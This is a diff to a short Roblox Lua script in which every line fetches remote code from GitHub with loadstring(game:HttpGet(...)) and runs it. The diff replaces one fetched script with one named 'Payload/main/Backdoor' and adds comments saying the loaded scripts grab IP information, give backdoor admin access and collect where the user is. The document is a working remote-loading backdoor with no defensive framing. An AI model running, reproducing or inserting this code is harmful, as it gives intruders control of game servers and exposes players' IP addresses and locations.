@@ -1,11 +1,11 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/IuniversalPscript",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/IuniversalPscript",true))() -- BasicalIP
 
 wait()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/Payloadforbonzi",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/Backdoor",true))() -- BasicalBackdoorAdmin
 
 
 wait()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/opchatLog",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/ScriptsCollection/main/opchatLog",true))() -- BasicalInfoAbtGameAndWheresUser
 
 -- loadstring(game:HttpGet("",true))()
 wait(1)
